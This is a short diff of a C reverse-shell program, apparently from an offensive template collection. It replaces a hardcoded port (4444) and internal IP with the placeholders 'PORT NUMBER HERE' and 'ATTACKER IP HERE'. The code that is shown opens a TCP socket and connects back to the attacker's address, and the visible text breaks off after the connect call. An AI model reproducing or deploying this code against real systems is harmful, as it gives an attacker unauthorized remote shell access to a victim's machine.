@@ -8,13 +8,13 @@
 
 int main(void){
 	int sockt;
-	int port = 4444;
+	int port = PORT NUMBER HERE;
 	struct sockaddr_in revsockaddr;
 
 	sockt = socket(AF_INET, SOCK_STREAM, 0);
 	revsockaddr.sin_family = AF_INET;
 	revsockaddr.sin_port = htons(port);
-	revsockaddr.sin_addr.s_addr = inet_addr("10.0.114.26");
+	revsockaddr.sin_addr.s_addr = inet_addr("ATTACKER IP HERE");
 
 	connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
 	
